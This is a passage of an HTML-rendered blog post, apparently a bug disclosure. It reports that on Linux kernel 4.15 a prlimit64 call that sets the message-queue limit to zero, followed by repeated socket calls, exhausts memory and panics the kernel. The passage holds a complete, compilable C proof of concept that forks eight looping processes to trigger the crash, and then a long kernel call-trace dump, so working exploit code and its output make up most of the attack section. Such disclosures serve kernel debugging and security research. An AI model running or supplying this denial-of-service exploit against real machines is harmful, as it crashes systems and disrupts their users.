9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>prlimit64 (leading to kernel panic)</h2>\n<p>W4F, not serious :).</p>\n<p>I just found a crash on LK v4.15.x (maybe the most of LKs). It has to happen.\nBecause, resizing limitation of MSGQUEUE to <strong>0</strong> and calling socket$xxx repeatedly, as result, occurs OOM (out of memory).</p>\n<h3 id=\"poc\" style=\"position:relative;\"><a href=\"#poc\" aria-label=\"poc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PoC</h3>\n<blockquote>\n<p>gcc -o poc -std=c99 poc.c</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_GNU_SOURCE</span> </span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/syscall.h></span></span>\n\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">loop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">syscall</span><span class=\"token punctuation\">(</span>__NR_mmap<span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// just space</span>\n\t<span class=\"token function\">syscall</span><span class=\"token punctuation\">(</span>__NR_prlimit64<span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 0x7 => RLIMIT_MSGQUEUE</span>\n\t<span class=\"token function\">syscall</span><span class=\"token punctuation\">(</span>__NR_socket<span class=\"token punctuation\">,</span> <span class=\"token number\">0x2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// socket$inet_tcp</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">int</span> pid <span class=\"token operator\">=</span> <span class=\"token function\">fork</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pid <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token function\">loop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// wait</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"call-trace-dump-2\" style=\"position:relative;\"><a href=\"#call-trace-dump-2\" aria-label=\"call trace dump 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Call Trace (Dump)</h3>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token punctuation\">[</span>   <span class=\"token number\">61.885712</span><span class=\"token punctuation\">]</span> CPU<span class=\"token operator\">:</span> <span class=\"token number\">1</span> PID<span class=\"token operator\">:</span> <span class=\"token number\">1</span> Comm<span class=\"token operator\">:</span> init Not tainted <span class=\"token number\">4.15</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span>rc4<span class=\"token operator\">+</span> #<span class=\"token number\">4</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.885987</span><span class=\"token punctuation\">]</span> Hardware name<span class=\"token operator\">:</span> QEMU Standard <span class=\"token function\">PC</span> <span class=\"token punctuation\">(</span>i440FX <span class=\"token operator\">+</span> PIIX<span class=\"token punctuation\">,</span> <span class=\"token number\">1996</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> BIOS Ubuntu<span class=\"token operator\">-</span><span class=\"token number\">1.8</span><span class=\"token number\">.2</span><span class=\"token operator\">-</span><span class=\"token number\">1u</span>buntu1 <span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">01</span><span class=\"token operator\">/</span><span class=\"token number\">2014</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.886426</span><span class=\"token punctuation\">]</span> Call Trace<span class=\"token operator\">:</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.886553</span><span class=\"token punctuation\">]</span>  dump_stack<span class=\"token operator\">+</span><span class=\"token number\">0x104</span><span class=\"token operator\">/</span><span class=\"token number\">0x1cd</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.886723</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> _atomic_dec_and_lock<span class=\"token operator\">+</span><span class=\"token number\">0x153</span><span class=\"token operator\">/</span><span class=\"token number\">0x153</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.886945</span><span class=\"token punctuation\">]</span>  panic<span class=\"token operator\">+</span><span class=\"token number\">0x1aa</span><span class=\"token operator\">/</span><span class=\"token number\">0x39b</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.887095</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> add_taint<span class=\"token punctuation\">.</span>cold<span class=\"token punctuation\">.</span><span class=\"token number\">3</span><span class=\"token operator\">+</span><span class=\"token number\">0x16</span><span class=\"token operator\">/</span><span class=\"token number\">0x16</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.887291</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> blocking_notifier_call_chain<span class=\"token operator\">+</span><span class=\"token number\">0xc5</span><span class=\"token operator\">/</span><span class=\"token number\">0x160</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.887533</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> srcu_init_notifier_head<span class=\"token operator\">+</span><span class=\"token number\">0x80</span><span class=\"token operator\">/</span><span class=\"token number\">0x80</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.887752</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> rcutorture_record_progress<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token operator\">/</span><span class=\"token number\">0x10</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.887981</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> save_trace<span class=\"token operator\">+</span><span class=\"token number\">0x2f0</span><span class=\"token operator\">/</span><span class=\"token number\">0x2f0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.888170</span><span class=\"token punctuation\">]</span>  out_of_memory<span class=\"token punctuation\">.</span>cold<span class=\"token punctuation\">.</span><span class=\"token number\">38</span><span class=\"token operator\">+</span><span class=\"token number\">0x1e</span><span class=\"token operator\">/</span><span class=\"token number\">0x64</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.888378</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> oom_killer_disable<span class=\"token operator\">+</span><span class=\"token number\">0x2c0</span><span class=\"token operator\">/</span><span class=\"token number\">0x2c0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.888604</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> mutex_trylock<span class=\"token operator\">+</span><span class=\"token number\">0x1fe</span><span class=\"token operator\">/</span><span class=\"token number\">0x260</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.888791</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __alloc_pages_slowpath<span class=\"token operator\">+</span><span class=\"token number\">0x119d</span><span class=\"token operator\">/</span><span class=\"token number\">0x29c0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.889023</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> ww_mutex_lock<span class=\"token punctuation\">.</span>part<span class=\"token punctuation\">.</span><span class=\"token number\">2</span><span class=\"token operator\">+</span><span class=\"token number\">0xf0</span><span class=\"token operator\">/</span><span class=\"token number\">0xf0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.889243</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __alloc_pages_slowpath<span class=\"token operator\">+</span><span class=\"token number\">0x1f6c</span><span class=\"token operator\">/</span><span class=\"token number\">0x29c0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.889481</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> sched_clock<span class=\"token operator\">+</span><span class=\"token number\">0x5</span><span class=\"token operator\">/</span><span class=\"token number\">0x10</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.889656</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> warn_alloc<span class=\"token operator\">+</span><span class=\"token number\">0x110</span><span class=\"token operator\">/</span><span class=\"token number\">0x110</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.889833</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> lock_downgrade<span class=\"token operator\">+</span><span class=\"token number\">0x690</span><span class=\"token operator\">/</span><span class=\"token number\">0x690</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.890028</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> lock_release<span class=\"token operator\">+</span><span class=\"token number\">0xff0</span><span class=\"token operator\">/</span><span class=\"token number\">0xff0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.890222</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> radix_tree_lookup_slot<span class=\"token operator\">+</span><span class=\"token number\">0x91</span><span class=\"token operator\">/</span><span class=\"token number\">0xd0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.890439</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> rcutorture_record_progress<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token operator\">/</span><span class=\"token number\">0x10</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.890670</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> rcu_read_lock_sched_held<span class=\"token operator\">+</span><span class=\"token number\">0xe4</span><span class=\"token operator\">/</span><span class=\"token number\">0x120</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.890901</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> find_get_entry<span class=\"token operator\">+</span><span class=\"token number\">0x50c</span><span class=\"token operator\">/</span><span class=\"token number\">0xa10</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.891092</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __alloc_pages_slowpath<span class=\"token operator\">+</span><span class=\"token number\">0x29c0</span><span class=\"token operator\">/</span><span class=\"token number\">0x29c0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.891334</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __lock_acquire<span class=\"token operator\">+</span><span class=\"token number\">0x7a7</span><span class=\"token operator\">/</span><span class=\"token number\">0x40c0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.891530</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> debug_check_no_locks_freed<span class=\"token operator\">+</span><span class=\"token number\">0x200</span><span class=\"token operator\">/</span><span class=\"token number\">0x200</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.891769</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> pvclock_read_flags<span class=\"token operator\">+</span><span class=\"token number\">0x150</span><span class=\"token operator\">/</span><span class=\"token number\">0x150</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.891977</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> save_trace<span class=\"token operator\">+</span><span class=\"token number\">0x2f0</span><span class=\"token operator\">/</span><span class=\"token number\">0x2f0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.892163</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> kvm_sched_clock_read<span class=\"token operator\">+</span><span class=\"token number\">0x21</span><span class=\"token operator\">/</span><span class=\"token number\">0x30</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.892370</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> sched_clock<span class=\"token operator\">+</span><span class=\"token number\">0x5</span><span class=\"token operator\">/</span><span class=\"token number\">0x10</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.892538</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> sched_clock_cpu<span class=\"token operator\">+</span><span class=\"token number\">0x18</span><span class=\"token operator\">/</span><span class=\"token number\">0x170</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.892733</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> kvm_sched_clock_read<span class=\"token operator\">+</span><span class=\"token number\">0x21</span><span class=\"token operator\">/</span><span class=\"token number\">0x30</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.892940</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> sched_clock<span class=\"token operator\">+</span><span class=\"token number\">0x5</span><span class=\"token operator\">/</span><span class=\"token number\">0x10</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.893108</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> find_held_lock<span class=\"token operator\">+</span><span class=\"token number\">0x39</span><span class=\"token operator\">/</span><span class=\"token number\">0x1c0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.893306</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __lock_is_held<span class=\"token operator\">+</span><span class=\"token number\">0xb4</span><span class=\"token operator\">/</span><span class=\"token number\">0x140</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.893497</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> rcutorture_record_progress<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token operator\">/</span><span class=\"token number\">0x10</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.893736</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __alloc_pages_nodemask<span class=\"token operator\">+</span><span class=\"token number\">0x8e6</span><span class=\"token operator\">/</span><span class=\"token number\">0xbc0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.893961</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __alloc_pages_slowpath<span class=\"token operator\">+</span><span class=\"token number\">0x29c0</span><span class=\"token operator\">/</span><span class=\"token number\">0x29c0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.894195</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> find_get_pages_contig<span class=\"token operator\">+</span><span class=\"token number\">0xf60</span><span class=\"token operator\">/</span><span class=\"token number\">0xf60</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.894415</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> deref_stack_reg<span class=\"token operator\">+</span><span class=\"token number\">0x9b</span><span class=\"token operator\">/</span><span class=\"token number\">0x100</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.894608</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> kvm_sched_clock_read<span class=\"token operator\">+</span><span class=\"token number\">0x21</span><span class=\"token operator\">/</span><span class=\"token number\">0x30</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.894814</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> sched_clock<span class=\"token operator\">+</span><span class=\"token number\">0x5</span><span class=\"token operator\">/</span><span class=\"token number\">0x10</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.894982</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> sched_clock_cpu<span class=\"token operator\">+</span><span class=\"token number\">0x18</span><span class=\"token operator\">/</span><span class=\"token number\">0x170</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.895178</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> save_trace<span class=\"token operator\">+</span><span class=\"token number\">0x2f0</span><span class=\"token operator\">/</span><span class=\"token number\">0x2f0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.895354</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __lock_acquire<span class=\"token operator\">+</span><span class=\"token number\">0x7a7</span><span class=\"token operator\">/</span><span class=\"token number\">0x40c0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.895560</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> alloc_pages_current<span class=\"token operator\">+</span><span class=\"token number\">0xac</span><span class=\"token operator\">/</span><span class=\"token number\">0x1e0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.895768</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __page_cache_alloc<span class=\"token operator\">+</span><span class=\"token number\">0x2ed</span><span class=\"token operator\">/</span><span class=\"token number\">0x360</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.895977</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> find_held_lock<span class=\"token operator\">+</span><span class=\"token number\">0x39</span><span class=\"token operator\">/</span><span class=\"token number\">0x1c0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.896218</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> page_endio<span class=\"token operator\">+</span><span class=\"token number\">0x760</span><span class=\"token operator\">/</span><span class=\"token number\">0x760</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.896406</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> filemap_fault<span class=\"token operator\">+</span><span class=\"token number\">0xd41</span><span class=\"token operator\">/</span><span class=\"token number\">0x1930</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.896605</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __lock_page_or_retry<span class=\"token operator\">+</span><span class=\"token number\">0x4c0</span><span class=\"token operator\">/</span><span class=\"token number\">0x4c0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.896820</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> rcutorture_record_progress<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token operator\">/</span><span class=\"token number\">0x10</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.897048</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> pvclock_read_flags<span class=\"token operator\">+</span><span class=\"token number\">0x150</span><span class=\"token operator\">/</span><span class=\"token number\">0x150</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.897263</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> filemap_map_pages<span class=\"token operator\">+</span><span class=\"token number\">0xbe3</span><span class=\"token operator\">/</span><span class=\"token number\">0x1350</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.897476</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __lock_acquire<span class=\"token operator\">+</span><span class=\"token number\">0x7a7</span><span class=\"token operator\">/</span><span class=\"token number\">0x40c0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.897667</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> find_get_pages_range_tag<span class=\"token operator\">+</span><span class=\"token number\">0xf10</span><span class=\"token operator\">/</span><span class=\"token number\">0xf10</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.897899</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> save_trace<span class=\"token operator\">+</span><span class=\"token number\">0x2f0</span><span class=\"token operator\">/</span><span class=\"token number\">0x2f0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.898074</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> kvm_sched_clock_read<span class=\"token operator\">+</span><span class=\"token number\">0x21</span><span class=\"token operator\">/</span><span class=\"token number\">0x30</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.898289</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> sched_clock<span class=\"token operator\">+</span><span class=\"token number\">0x5</span><span class=\"token operator\">/</span><span class=\"token number\">0x10</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.898461</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> debug_check_no_locks_freed<span class=\"token operator\">+</span><span class=\"token number\">0x200</span><span class=\"token operator\">/</span><span class=\"token number\">0x200</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.898701</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> save_trace<span class=\"token operator\">+</span><span class=\"token number\">0x2f0</span><span class=\"token operator\">/</span><span class=\"token number\">0x2f0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.898881</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> find_held_lock<span class=\"token operator\">+</span><span class=\"token number\">0x39</span><span class=\"token operator\">/</span><span class=\"token number\">0x1c0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.899071</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> ext4_filemap_fault<span class=\"token operator\">+</span><span class=\"token number\">0x78</span><span class=\"token operator\">/</span><span class=\"token number\">0xa7</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.899276</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> lock_acquire<span class=\"token operator\">+</span><span class=\"token number\">0x15b</span><span class=\"token operator\">/</span><span class=\"token number\">0x430</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.899461</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> lock_contended<span class=\"token operator\">+</span><span class=\"token number\">0xe70</span><span class=\"token operator\">/</span><span class=\"token number\">0xe70</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.899654</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> lock_release<span class=\"token operator\">+</span><span class=\"token number\">0xff0</span><span class=\"token operator\">/</span><span class=\"token number\">0xff0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.899849</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> down_read<span class=\"token operator\">+</span><span class=\"token number\">0xb5</span><span class=\"token operator\">/</span><span class=\"token number\">0x180</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.900018</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> down_write_killable_nested<span class=\"token operator\">+</span><span class=\"token number\">0x190</span><span class=\"token operator\">/</span><span class=\"token number\">0x190</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.900269</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> ext4_filemap_fault<span class=\"token operator\">+</span><span class=\"token number\">0x80</span><span class=\"token operator\">/</span><span class=\"token number\">0xa7</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.900468</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __do_fault<span class=\"token operator\">+</span><span class=\"token number\">0xd8</span><span class=\"token operator\">/</span><span class=\"token number\">0x360</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.900641</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> print_bad_pte<span class=\"token operator\">+</span><span class=\"token number\">0x5b0</span><span class=\"token operator\">/</span><span class=\"token number\">0x5b0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.900831</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> pvclock_read_flags<span class=\"token operator\">+</span><span class=\"token number\">0x150</span><span class=\"token operator\">/</span><span class=\"token number\">0x150</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.901039</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> __handle_mm_fault<span class=\"token operator\">+</span><span class=\"token number\">0x11d9</span><span class=\"token operator\">/</span><span class=\"token number\">0x3080</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.901255</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> sched_clock<span class=\"token operator\">+</span><span class=\"token number\">0x5</span><span class=\"token operator\">/</span><span class=\"token number\">0x10</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.901422</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> sched_clock_cpu<span class=\"token operator\">+</span><span class=\"token number\">0x18</span><span class=\"token operator\">/</span><span class=\"token number\">0x170</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.901612</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> find_held_lock<span class=\"token operator\">+</span><span class=\"token number\">0x39</span><span class=\"token operator\">/</span><span class=\"token number\">0x1c0</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token number\">61.901801</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">?</span> vm_insert_mixed_mkwrite<span class=\"token operator\">+</span><span class=\"token number\">0x30</span><span class=\"token operator\">/</span><span class=\"token number\">0x30</span>\n<span class=\"token punctuation\">[</span>   <span class=\"token 